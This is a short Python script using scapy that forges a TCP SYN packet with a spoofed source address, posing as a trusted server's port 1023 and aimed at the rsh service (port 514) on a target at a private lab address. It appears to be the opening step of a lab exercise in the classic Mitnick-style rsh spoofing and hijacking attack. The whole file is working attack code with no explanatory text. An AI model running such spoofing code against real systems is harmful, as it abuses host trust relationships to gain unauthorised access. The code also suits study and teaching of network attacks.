#!/usr/bin/python3
from scapy.all import *

x_ip     = "10.99.46.189"
x_port   = 514
srv_ip   = "10.99.46.51"
srv_port = 1023

ip  = IP(src=srv_ip, dst=x_ip)
tcp = TCP(sport=srv_port, dport=x_port, flags="S", seq=0x1000)

send(ip/tcp, verbose=1)
print("[+] SYN envoyé")